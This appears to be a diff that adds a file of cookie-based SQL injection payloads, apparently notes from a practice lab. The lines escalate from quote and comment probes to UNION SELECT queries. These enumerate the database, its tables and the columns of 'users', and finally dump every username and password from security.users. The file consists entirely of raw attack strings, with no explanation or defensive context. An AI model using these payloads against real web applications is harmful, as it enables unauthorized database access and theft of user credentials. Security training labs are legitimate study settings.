@@ -1,0 +1,14 @@
+Cookie:admin
+Cookie:
+Cookie:admin
+Cookie:
+Cookie:admin
+Cookie:
+Cookie:admin"
+Cookie:admin'#
+Cookie:admin' union select 1,1,database()#
+Cookie:admin' union select database(),1,1#
+Cookie:1' union select database(),1,1#
+Cookie:1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
+Cookie:1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#
+Cookie:1' union select 1,2,group_concat(username,":",password) from security.users#
